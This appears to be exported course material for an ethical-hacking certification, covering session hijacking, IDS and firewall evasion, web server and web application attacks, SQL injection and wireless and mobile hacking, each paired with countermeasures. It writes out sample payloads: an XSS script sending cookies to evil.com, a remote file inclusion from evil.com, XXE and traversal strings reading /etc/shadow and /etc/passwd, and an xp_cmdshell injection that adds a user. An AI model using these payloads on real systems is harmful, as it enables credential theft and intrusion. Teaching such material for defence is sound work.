Mitigating modern DDoS attacks requires robust infrastructure and specialized techniques.

  • Content Delivery Networks (CDNs): Deploying a CDN (like Cloudflare or Akamai) is a highly effective defense against DDoS. CDNs distribute web traffic across massive global networks of edge servers, successfully absorbing volumetric attacks and filtering out malicious requests before they can ever reach the origin server.
  • SYN Cookies: To defend specifically against SYN floods, servers can implement SYN cookies. Instead of allocating memory for every incoming SYN request, the server encodes the connection state into the TCP sequence number of the SYN-ACK response. It only allocates resources if a valid final ACK is received, neutralizing the resource exhaustion vector.
  • Ingress Filtering (BCP38): ISPs implement ingress filtering to drop packets with spoofed source IPs that don't belong to the transmitting network, fundamentally stopping reflection and amplification attacks.

modules.title: Session Hijacking
modules.description: Covers techniques for intercepting and taking over authenticated user sessions at both the network and application level, including session token prediction, XSS-based theft, session fixation, and blind hijacking.
objectives: Understand session hijacking concepts at network and application layers
Explain session token prediction and brute-forcing techniques
Perform XSS-based session theft and session fixation attacks
Describe man-in-the-browser and cross-site request forgery attacks
Implement session management countermeasures
Analyze CRIME and BREACH attacks on compressed HTTPS sessions

topics.title: Session Hijacking Concepts
topics.content:
Session hijacking aims to take over an established session between a user and a server by stealing, predicting, or manipulating a valid session token. This allows the attacker to impersonate the legitimate user without needing their credentials directly. Hijacking occurs at both the network layer and the application layer.

  • Active Hijacking: Taking over an existing session and interacting with the server. Typically involves silencing the client using DoS or ARP spoofing to prevent RST packets.
  • Passive Hijacking: Monitoring the session silently to capture data, such as sniffing unencrypted cookies.
  • Blind Hijacking: An attacker injects malicious data into an authenticated session without being able to see the response (often because they are not on the same network segment).

topics.title: Application-Level Session Attacks
topics.content:
Application-level hijacking targets session mechanisms (cookies, URL parameters, hidden form fields).

  • Session Fixation: The attacker forces a predetermined, known session ID onto a victim before they authenticate. If the server regenerates the session ID after successful login but fails to invalidate the old session ID, the attacker can continue using the fixed ID to access the authenticated session.
  • Session Prediction: Exploits weak token generation algorithms. Tokens constructed from predictable values like a username plus a current timestamp (e.g., admin1689456000), or using non-cryptographic RNGs, are highly vulnerable to session prediction attacks.
  • XSS-based Cookie Theft: Stored or reflected XSS attacks can steal session cookies. An attacker injects a malicious script (e.g., <script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>) that reads the victim's cookies via document.cookie and exfiltrates them.
  • Man-in-the-Browser (MitB): A Trojan operates inside the victim's browser process, intercepting and modifying web page content and transactions in real-time before they are encrypted by SSL/TLS. This defeats HTTPS protections.
  • Session Replay: Attackers use proxy tools like Burp Suite to intercept and replay a session token captured from an authenticated user.
  • CRIME and BREACH: These attacks exploit data compression (like gzip) in TLS and HTTP respectively. By injecting plaintext into a session and observing changes in the compressed payload size, attackers can deduce the contents of secret session cookies.

topics.title: Network-Level Session Hijacking
topics.content:
Network-level session hijacking involves intercepting transport-layer connections.

  • TCP Session Hijacking: To successfully inject packets into an active TCP session, the attacker must accurately predict the TCP sequence numbers (SEQ) and acknowledgment numbers (ACK) being used. TCP uses these sequence numbers to ensure packets are received in order; incorrect sequence numbers result in the packets being dropped or triggering RST (Reset) packets.
  • ARP Spoofing/Poisoning: Frequently used as a precursor to network session hijacking. By broadcasting forged ARP replies, an attacker associates their MAC address with the IP address of the default gateway, enabling a Man-in-the-Middle (MitM) position to intercept and modify TCP traffic.
  • Network Sniffing: Attackers use network protocol analyzers like Wireshark to sniff network traffic and extract session cookies from unencrypted HTTP communications or poorly implemented HTTPS configurations (e.g., via SSL stripping).

topics.title: Session Hijacking Countermeasures
topics.content:
Securing sessions requires multiple defense-in-depth strategies:

  • Secure Token Generation: Session tokens should be generated using cryptographically secure pseudorandom number generators (CSPRNG) with sufficient entropy (length) to thwart session prediction and brute-forcing.
  • Regeneration & Invalidation: To prevent session fixation, servers must regenerate the session ID and explicitly invalidate the pre-authentication session ID upon successful login.
  • HttpOnly Flag: Setting the HttpOnly attribute on session cookies instructs the browser to prevent client-side scripts (like JavaScript) from accessing the cookie, serving as a critical defense against XSS-based session theft.
  • Secure and SameSite Flags: The Secure flag ensures cookies are only transmitted over encrypted (HTTPS) connections. The SameSite attribute protects against CSRF and cross-site tracking by controlling when cookies are sent with cross-site requests.
  • Token Binding and Fingerprinting: Binding the session to additional client-specific attributes (such as IP address, User-Agent string, and TLS client certificate) makes stolen session tokens much harder to reuse from a different machine.
  • Avoid URL-based Tracking: URL-based session tracking (passing session IDs in GET parameters) is insecure because tokens can easily leak through HTTP Referer headers, proxy logs, or browser history.
  • HSTS and Encryption: Implement HTTP Strict Transport Security (HSTS) to mandate HTTPS connections, preventing downgrade attacks like SSL stripping. Use strong encryption protocols (IPsec, VPNs, TLS 1.3) to protect data in transit.

v13Updates: Advanced token prediction with machine learning
Modern SSO and OAuth hijacking techniques

modules.title: Evading IDS, Firewalls, and Honeypots
modules.description: Explains how intrusion detection systems, firewalls, and honeypots work, and covers various evasion techniques used by attackers to bypass these security controls.
objectives: Understand IDS, IPS, and firewall architectures and detection methods
Perform IDS evasion using fragmentation, obfuscation, encryption, and desynchronization
Bypass firewall rules using tunneling, covert channels, and source routing
Identify and evade honeypots and honeynets
Understand NAC and endpoint security evasion

topics.title: IDS/IPS and Firewall Concepts
topics.content:
Security monitoring and filtering rely on proper placement and configuration of defensive appliances.

Intrusion Detection System (IDS): Monitors network traffic or system activities and generates alerts when suspicious behavior is detected based on signatures (pattern matching) or anomalies (deviations from baselines). An IDS passively monitors and does not block traffic. Intrusion Prevention System (IPS): Sits inline with traffic and can actively drop malicious packets.

IDS Sensor Placement: For maximum visibility, an IDS sensor should be connected to a SPAN (Switched Port Analyzer) or mirror port on a switch, or via a network tap. This allows it to passively see copies of all traffic without introducing latency.

Firewalls: Filter traffic based on rules. Types include Packet Filtering (L3/L4 headers), Stateful Inspection (tracks connection state), and Application-Level Gateways (WAFs analyzing HTTP data). Demilitarized Zones (DMZ) isolate public-facing servers from internal networks.

topics.title: IDS Evasion Techniques
topics.content:
Attackers use various techniques to bypass IDS inspection by manipulating packet structures and payloads:

  • Fragmentation Attacks: Attackers fragment malicious packets into very small pieces (e.g., using Nmap's -f or -ff flags). Many older IDS systems struggle to reassemble fragmented packets correctly or fast enough, while the target host correctly reassembles the original malicious payload. Overlapping fragments can overwrite parts of the payload, creating a benign packet for the IDS but a malicious one for the host.
  • TTL-Based Insertion Attacks: The attacker sends extra "garbage" packets with low Time-To-Live (TTL) values. These packets reach the IDS (which is positioned closer) but expire before reaching the target host. The IDS reassembles a mixed, benign payload, while the host only sees the malicious packets.
  • Obfuscation and URL Encoding: Attackers encode payloads to evade signature matching. For example, URL encoding /../../etc/passwd as %2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd, or using Unicode encoding, base64, and hex encoding. If the IDS fails to decode all formats, the attack slips through.
  • Polymorphic Shellcode: Advanced attackers use self-modifying code techniques to change the binary pattern of the shellcode on each execution while maintaining the same functionality. This completely defeats signature-based IDS because no two instances share the same byte pattern.
  • Advanced Scanning Evasion (Decoys): Attackers use decoy IP addresses to obscure their real location. Using Nmap, nmap -D RND:10 <target> generates 10 random decoy IP addresses, flooding the IDS logs and hiding the actual source of the scan. Timing delays (like Nmap's -T0 paranoid mode) also evade rate-based thresholds.
  • Encryption: Tunneling attacks over encrypted protocols (SSH, SSL/TLS, VPNs) blinds the IDS unless it is configured for SSL interception/decryption.

topics.title: Firewall Bypass and Tunneling
topics.content:
Firewalls restrict traffic based on IP, port, and protocol rules. Attackers bypass these using tunneling and spoofing.

  • HTTP/HTTPS Tunneling: If a firewall only allows outbound web traffic, an attacker can encapsulate alternative protocols (like a reverse shell) inside HTTP or HTTPS packets. Since the firewall sees traffic on port 80 or 443, it permits it, effectively bypassing port restrictions.
  • ICMP Tunneling: Encapsulating data within ICMP Echo Request/Reply packets. If ping is allowed through the firewall, a covert channel can be established.
  • SSH Tunneling (Port Forwarding): Creating an encrypted SSH connection to a remote server and forwarding local or remote ports through it, bypassing deep packet inspection.
  • Source Routing: An attacker specifies the route a packet should take through the network, attempting to route packets around firewall inspection points. Most modern routers drop source-routed packets by default.
  • MAC/IP Spoofing: Faking the source IP or MAC address to appear as a trusted internal machine, bypassing access control lists (ACLs).
  • ACK Scanning: Sending packets with only the ACK flag set. Stateful firewalls might drop them if they don't belong to an established session, but simple packet filters might let them through, helping the attacker map out firewall rules (using Nmap's -sA).

topics.title: Honeypots and Honeynets
topics.content:
Honeypots are decoy systems designed to attract attackers, log their behavior, and waste their time. Honeynets are entire networks of such systems.

  • High-Interaction vs. Low-Interaction: High-interaction honeypots use real operating systems and services, providing a full environment for attackers. They capture detailed zero-day exploits and rootkits but are harder to maintain and carry higher risk if compromised. Low-interaction honeypots (like Honeyd) only simulate specific services (e.g., faking an FTP banner) and provide limited insight, but are low risk.
  • Honeypot Evasion and Detection: Attackers can identify honeypots by looking for specific signatures. Absence of legitimate activity is a strong indicator of a honeynet. Other indicators include detecting virtualization (checking MAC address vendors for VMware/VirtualBox, looking for specific drivers like vboxguest.sys), unnaturally fast or slow system responses, or finding standard honeypot configuration files and ports.

modules.title: Hacking Web Servers
modules.description: Covers web server architectures, common vulnerabilities, attack techniques including directory traversal, misconfiguration exploitation, and web server hardening best practices.
objectives: Understand web server architecture and common platforms (Apache, IIS, Nginx)
Identify web server vulnerabilities and misconfigurations
Perform directory traversal and web server exploitation
Use web server scanning tools for vulnerability assessment
Implement web server hardening countermeasures

topics.title: Web Server Architecture and Misconfigurations
topics.content:
Web servers are the foundation of web applications and are often deployed with critical security misconfigurations.

  • Default Installations: Leaving default credentials, sample applications, debugging scripts, and unnecessary modules enabled is highly dangerous. Attackers frequently search for default admin pages and known sample scripts.
  • Information Disclosure: Verbose error messages that reveal stack traces, database connection strings, OS versions, and internal file paths provide attackers with valuable intelligence. Disclosing the server version in HTTP headers (e.g., Server: Apache/2.4.49) enables attackers to target specific CVEs.
  • Host Header Injection: If a web server handles virtual hosting but fails to validate the HTTP Host header, attackers can manipulate it. This leads to attacks like web cache poisoning, where malicious responses are cached and served to other users, or password reset poisoning.
  • HTTP Response Splitting: This attack involves injecting malicious CRLF (Carriage Return Line Feed, %0d%0a) characters into HTTP headers. It manipulates how the response is processed by intermediaries (like proxies or caches), effectively splitting one response into two, leading to cache poisoning or XSS.

topics.title: Directory Traversal and File Exploitation
topics.content:
Directory traversal (path traversal) exploits insufficient input validation to access files outside the intended web root directory. Attackers use sequences like ../ or ..\ to navigate the file system (e.g., accessing /etc/passwd on Linux or C:\boot.ini on Windows).

  • Filter Evasion (Double Encoding): If a server filters basic ../ sequences, attackers use obfuscation. Double encoding URL-encodes the dot-dot-slash. Nested traversal uses ....//; when the basic filter removes ../, it leaves behind ../, successfully bypassing the control.
  • Null Byte Injection: Appending a null byte (%00) to a file path can trick older server functions (especially in C/C++ or PHP) into terminating the string early, bypassing extension checks (e.g., file=../../../etc/passwd%00.txt).
  • CVE-2021-41773 (Apache Path Traversal): A notable vulnerability in Apache 2.4.49 caused by a flaw in path normalization that failed to properly handle percent-encoded directory traversal sequences (like %2e%2e). It allowed attackers to bypass access controls and achieve Remote Code Execution (RCE) if CGI scripts were enabled.

topics.title: Web Server Attack Methodology & Scanning
topics.content:
Vulnerability scanning is a crucial step in attacking or defending web servers.

  • Nikto: An open-source web server scanner designed to perform comprehensive tests against web servers. It checks for over 6,700 potentially dangerous files, outdated server software, default index pages, and configuration issues.
  • Directory Brute Forcing: Tools like Dirb and Gobuster use wordlists to find hidden directories and files that aren't linked anywhere on the site (e.g., finding an unlinked /admin panel or a /backup.zip file).
  • Risk Prioritization: When reviewing scanner findings, prioritize data exposure. For example, finding a publicly accessible database backup file (e.g., backup.sql) presents the highest immediate risk because it likely contains sensitive user credentials, schema details, and application data.

topics.title: Web Server Hardening
topics.content:
Hardening a web server involves multiple defensive layers and the principle of least privilege:

  • Configuration: Remove all default installations, sample files, and disable unnecessary services, modules, and ports. Run the web server service under a dedicated, low-privilege account.
  • Error Handling: Configure generic error messages for production environments and log detailed errors internally to prevent information disclosure.
  • Security Headers: Implement HTTP Strict-Transport-Security (HSTS) to instruct browsers to strictly use HTTPS, preventing SSL stripping and protocol downgrade attacks. Implement X-Frame-Options to prevent Clickjacking, and Content-Security-Policy (CSP) to mitigate XSS.
  • Access Control: Validate and whitelist the Host header to prevent injection attacks. Use Web Application Firewalls (WAF) to filter malicious traffic. Ensure strict directory permissions to prevent unauthorized file access.

modules.title: Hacking Web Applications
modules.description: Deep dive into web application vulnerabilities based on the OWASP Top 10, covering XSS, CSRF, SSRF, broken authentication, file uploads, and modern web application attack techniques.
objectives: Understand the OWASP Top 10 vulnerability categories
Perform Cross-Site Scripting (XSS), CSRF, and SSRF attacks
Exploit broken authentication, IDOR, and insecure deserialization
Execute file upload and local/remote file inclusion (LFI/RFI) attacks
Implement secure coding practices and WAF protections

topics.title: OWASP Top 10 and Access Control
topics.content:
The OWASP Top 10 outlines the most critical web application security risks, with Broken Access Control ranked as the number one risk. Broken Access Control occurs when users can act outside their intended permissions, leading to unauthorized information disclosure, modification, or destruction.

A primary example is Insecure Direct Object References (IDOR). IDOR occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks. For instance, if an attacker changes an API URL from /api/user/1234/profile to /api/user/1235/profile and successfully views another user's data, they have exploited IDOR. Another access control failure is Privilege Escalation, where a standard user manipulates parameters to gain administrator rights.

topics.title: Cross-Site Scripting (XSS)
topics.content:
Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute malicious scripts in the victim's browser.

  • Stored (Persistent) XSS: The malicious script is saved permanently on the target server (e.g., in a database, forum post, or comment field). It executes every time any user views the affected page. This is the most dangerous form.
  • Reflected (Non-Persistent) XSS: The injected script is reflected off the web server, such as in an error message or search result. It requires social engineering, forcing the victim to click a specially crafted URL containing the payload (e.g., http://site.com/search?q=<script>alert(1)</script>).
  • DOM-based XSS: The vulnerability exists purely in the client-side code rather than the server-side code. The malicious payload is executed as a result of modifying the DOM environment in the victim's browser, often involving sources like window.location and sinks like innerHTML.

Defenses include contextual output encoding, strict input validation, and implementing a strong Content Security Policy (CSP).

topics.title: CSRF, SSRF, and XXE
topics.content:
Cross-Site Request Forgery (CSRF): Tricks the victim's browser into making unintended, authenticated requests to a vulnerable application. For example, an attacker hosts a hidden HTML form pointing to a banking transfer URL and uses JavaScript to auto-submit it. The browser automatically includes the victim's session cookies. Defense requires Anti-CSRF tokens; however, the server must actively validate that the token matches a value stored on the server for that specific session.

Server-Side Request Forgery (SSRF): The attacker coerces the vulnerable server into making requests to unintended internal or external resources. A common, highly critical SSRF target in cloud environments (AWS, Azure, GCP) is the cloud instance metadata endpoint (e.g., http://169.254.169.254/latest/meta-data/). By fetching this URL, attackers can retrieve sensitive IAM credentials, API keys, and infrastructure details.

XML External Entity (XXE) Injection: Targets poorly configured XML parsers. An attacker submits an XML payload with a malicious <!DOCTYPE> declaration defining an external entity (e.g., <!ENTITY xxe SYSTEM "file:///etc/shadow">). When parsed, the entity (&xxe;) is replaced with the local file's contents, leading to data disclosure. Defense involves disabling external entity parsing and DTD processing.

topics.title: Authentication, File Uploads, and LFI/RFI
topics.content:
Authentication Vulnerabilities: Modern apps often use JSON Web Tokens (JWT). A critical vulnerability is JWT Algorithm Confusion. An attacker modifies the JWT header to specify {"alg":"none"} and removes the digital signature. If the server accepts the 'none' algorithm, it allows forging arbitrary tokens with admin claims. Other issues include credential stuffing and lack of rate limiting.

Insecure File Uploads: If a server only validates file extensions (e.g., .jpg) via client-side checks or simple string matching, an attacker can bypass this. Techniques include using a double extension (e.g., shell.php.jpg), changing the MIME type in the Content-Type header via Burp Suite, or using null bytes (shell.php%00.jpg). Once uploaded, the web shell grants Remote Code Execution.

File Inclusion (LFI/RFI): Local File Inclusion (LFI) allows an attacker to include files existing on the server (e.g., ?page=../../etc/passwd). Remote File Inclusion (RFI) allows including malicious scripts from external servers (e.g., ?page=http://evil.com/shell.txt). LFI in PHP applications often uses wrappers like php://filter/convert.base64-encode/resource=index.php to read source code without executing it.

modules.title: SQL Injection
modules.description: In-depth coverage of SQL injection attack types (in-band, blind, out-of-band), exploitation techniques with SQLMap, and comprehensive prevention through parameterized queries, stored procedures, and input validation.
objectives: Understand SQL injection concepts, mechanics, and attack types
Perform in-band (Error/UNION), blind (Boolean/Time), and out-of-band SQL injection
Use SQLMap for automated SQL injection discovery and exploitation
Extract data, escalate privileges, and execute OS commands via SQLi
Implement robust SQL injection countermeasures

topics.title: SQL Injection Fundamentals
topics.content:
SQL Injection (SQLi) occurs when untrusted user input is concatenated directly into database queries without proper parameterization or escaping. This allows attackers to alter the query logic to view, modify, or delete database information.

A classic example is Authentication Bypass. If an attacker enters ' OR '1'='1' -- into a username field, the query becomes SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = '...'. The single quote breaks out of the string, OR '1'='1' creates a universally true condition, and -- comments out the password check. The database returns the first user (often the administrator), granting unauthorized access.

topics.title: In-Band SQL Injection
topics.content:
In-band SQL injection (or classic SQLi) occurs when the attacker uses the same communication channel to launch the attack and directly retrieve the results in the application's HTTP response.

  • Error-Based SQLi: Extracts data by intentionally injecting syntax errors or mathematical impossibilities (like divide by zero or converting text to integers) to trigger database errors. If verbose error logging is on, the error message leaks table names, column names, or actual data.
  • UNION-Based SQLi: Uses the UNION SELECT operator to combine results from the injected malicious query with the original legitimate query. Before a UNION-based attack can work, the attacker must first determine the exact number of columns returned by the original query. This is often achieved by incrementing an ORDER BY clause (e.g., ORDER BY 1, ORDER BY 2... until an error occurs) or injecting multiple NULL values (UNION SELECT NULL, NULL...). Furthermore, the data types of the injected columns must match the original query.

topics.title: Blind SQL Injection
topics.content:
Blind SQL Injection is used when the application is vulnerable to injection but does not display query results or error messages directly in the HTTP response. Data must be extracted slowly, bit by bit.

  • Boolean-Based (Inferential) Blind SQLi: The attacker infers information by asking the database true/false questions and observing if the application returns a different or empty page. For example, comparing the response of /products?id=1 AND 1=1 (true condition, normal page returned) against /products?id=1 AND 1=2 (false condition, missing content or different page returned). Attackers use functions like SUBSTRING() to guess letters one by one.
  • Time-Based Blind SQLi: Used when the application response is identical regardless of the query outcome. The attacker infers true/false conditions by injecting time delay functions. For example, using Microsoft SQL Server's WAITFOR DELAY '0:0:5', PostgreSQL's pg_sleep(5), or MySQL's SLEEP(5). If the injected condition is true, the server delays responding for 5 seconds, confirming the guess.

topics.title: Advanced SQL Injection, OOB, and Automation
topics.content:
Advanced SQLi techniques extend capabilities beyond basic extraction:

  • Out-of-Band (OOB) SQLi: Used when direct responses are absent and time delays are impractical. The attacker forces the database server to initiate an external network connection (e.g., DNS resolution or HTTP request) to a server they control, embedding the stolen data in the request. In MSSQL, xp_dirtree can trigger SMB or DNS requests.
  • Second-Order (Stored) SQLi: The malicious payload is submitted safely into the database during the initial request (bypassing input validation). It is triggered later when another application function retrieves the stored data and executes it within a new, unparameterized SQL query.
  • OS Command Execution: Attackers can escalate SQL injection to operating system-level access. In Microsoft SQL Server, the xp_cmdshell extended stored procedure allows executing OS commands. An attacker can inject '; EXEC xp_cmdshell 'net user hacker P@ss123 /add' -- to create a new Windows user account. In MySQL, attackers might use INTO OUTFILE to write a PHP web shell to the web root.
  • WAF Evasion: When standard SQL keywords are blocked by a WAF, attackers use evasion. Techniques include case variation (uNiOn SeLeCt), inline comments to break up words (SEL/**/ECT or /*!SELECT*/), URL/hex/Unicode encoding, or replacing spaces with tabs or newlines.
  • SQLMap Automation: sqlmap automates SQLi discovery and exploitation. For example, sqlmap -u 'http://target.com/page?id=1' --dbs --batch tests the 'id' parameter and enumerates all databases non-interactively. Flags like --os-shell attempt to gain a command prompt.

topics.title: SQL Injection Countermeasures
topics.content:
Defense requires secure coding practices at the application layer:

  • Parameterized Queries (Prepared Statements): This is the most effective, primary defense against all forms of SQL injection. Parameterization completely separates the SQL code structure from the user-supplied data. The database engine treats user input strictly as literal string or integer data, never interpreting it as executable SQL code, regardless of special characters (like quotes or semicolons) contained in the input.
  • Stored Procedures: When properly parameterized, stored procedures provide a similar level of protection to prepared statements, while encapsulating queries on the database side.
  • Input Validation and Escaping: Validate input against strict allow-lists (type, length, format). Escaping characters (like doubling single quotes) is a weaker, secondary defense and prone to bypasses.
  • Least Privilege: Ensure the database account used by the web application has the absolute minimum permissions required. Do not use the `sa` or `root` accounts. Revoke access to dangerous stored procedures like `xp_cmdshell`.

v13Updates: AI-assisted SQLi payload generation and evasion

modules.title: Hacking Wireless Networks
modules.description: Covers wireless network standards, encryption protocols (WEP through WPA3), wireless attack techniques including evil twin and KRACK, and Bluetooth hacking methods.
objectives: Understand wireless networking standards and encryption protocols
Differentiate between WEP, WPA, WPA2, and WPA3 security
Perform wireless network attacks using Aircrack-ng suite
Set up evil twin and rogue access point attacks
Identify Bluetooth vulnerabilities and attacks

topics.title: Wireless Standards and Encryption
topics.content:
IEEE 802.11 standards define wireless networking, including newer iterations like 802.11ax (Wi-Fi 6), which provides better efficiency and capacity. Earlier standards include 802.11a/b/g/n/ac.

  • WEP: An obsolete standard that uses RC4 and is highly vulnerable to IV reuse attacks.
  • WPA: Introduced the Temporal Key Integrity Protocol (TKIP) to provide per-packet key mixing, fixing WEP's immediate flaws while remaining compatible with legacy hardware.
  • WPA2: Mandates the use of AES-CCMP (Advanced Encryption Standard - Counter Mode with CBC-MAC Protocol), which provides robust confidentiality via AES and integrity via CBC-MAC.
  • WPA3: Replaces WPA2's Pre-Shared Key (PSK) with Simultaneous Authentication of Equals (SAE), a zero-knowledge proof protocol (Dragonfly handshake) that protects against offline dictionary attacks.

topics.title: Wireless Attack Techniques and Vulnerabilities
topics.content:
Wireless networks are susceptible to numerous attacks targeting their protocols and configurations.

  • WPA2 Handshake Cracking: Attackers capture the 4-way handshake and perform offline dictionary or brute-force attacks using tools like Aircrack-ng or Hashcat. The handshake itself doesn't contain the password but has enough data to verify guesses offline.
  • Deauthentication Attacks: Attackers send spoofed management frames from the AP to force clients to disconnect. Using tools like aireplay-ng -0 5 -a [BSSID] -c [Client MAC] sends 5 deauth frames, often used to capture a handshake upon reconnection.
  • KRACK (Key Reinstallation Attack): Exploits a flaw in the WPA2 4-way handshake by manipulating and replaying messages to force reinstallation of an already-in-use encryption key, enabling traffic decryption.
  • WPS Flaws: Wi-Fi Protected Setup (WPS) uses an 8-digit PIN validated in two halves. Tools like Reaver or Bully exploit this to recover the WPA/WPA2 passphrase via brute-force.
  • MAC Spoofing: Changing a wireless card's MAC address to match an authorized client to bypass MAC filtering or captive portals.

topics.title: Evil Twin and Rogue Access Points
topics.content:
An Evil Twin attack involves setting up a malicious rogue access point with the same SSID as a legitimate network, often with a stronger signal, tricking users into connecting to intercept their traffic.

This is frequently combined with Captive Portal Phishing, presenting a fake login page to steal credentials. In enterprise environments using PEAP-MSCHAPv2, an attacker can set up a rogue RADIUS server and an evil twin to capture MSCHAPv2 challenge-response hashes, which are then cracked offline using tools like asleap or hashcat.

topics.title: Bluetooth and RFID Hacking
topics.content:
Wireless attacks extend beyond Wi-Fi to other short-range protocols:

  • Bluejacking: Sending unsolicited messages or vCards to nearby Bluetooth devices (mostly a nuisance).
  • Bluesnarfing: Unauthorized extraction of data (contacts, messages) from a Bluetooth device.
  • Bluebugging: Exploiting vulnerabilities to gain full backdoor control of a device to make calls, send texts, and listen to conversations.
  • RFID Cloning: Attackers use devices like the Proxmark3 to clone Radio Frequency Identification (RFID) badges, gaining unauthorized physical access to secure buildings.

topics.title: Reconnaissance and Tooling
topics.content:
Gathering intelligence on wireless networks is a critical first step.

  • Wardriving: The act of searching for Wi-Fi networks by a person in a moving vehicle using a portable computer or smartphone.
  • Kismet: A widely used passive 802.11 layer2 wireless network detector, sniffer, and WIDS. Because it operates passively, it is undetectable.
  • SSID Hiding: Disabling SSID broadcasting is merely security through obscurity. The SSID is still transmitted in plaintext within client probe requests and responses.
  • Antennas: Using a Yagi antenna allows attackers to focus a wireless signal in a highly directional manner to achieve greater range and precision.

modules.title: Hacking Mobile Platforms
modules.description: Explores Android and iOS security architectures, mobile attack vectors, OWASP Mobile Top 10 vulnerabilities, MDM bypass techniques, and techniques for evading IDS and firewalls.
objectives: Understand Android and iOS security architectures
Identify OWASP Mobile Top 10 vulnerabilities
Perform jailbreaking and rooting for security testing
Analyze mobile applications for security weaknesses
Implement techniques for evading IDS, firewalls, and honeypots

topics.title: Mobile Platform Architecture & Sandboxing
topics.content:
Mobile operating systems use sandboxing to isolate applications and protect user data. The Android Application Sandbox leverages Linux's user-based protection model. Each app runs as a separate Linux user with a unique UID, preventing apps from accessing each other's data by default.

Android APKs must be digitally signed to verify the developer's identity and ensure code integrity. Unsigned APKs cannot be installed without the user explicitly enabling Install from Unknown Sources or using ADB, creating an attack vector for social engineering.

topics.title: Rooting, Jailbreaking, and MDM Bypass
topics.content:
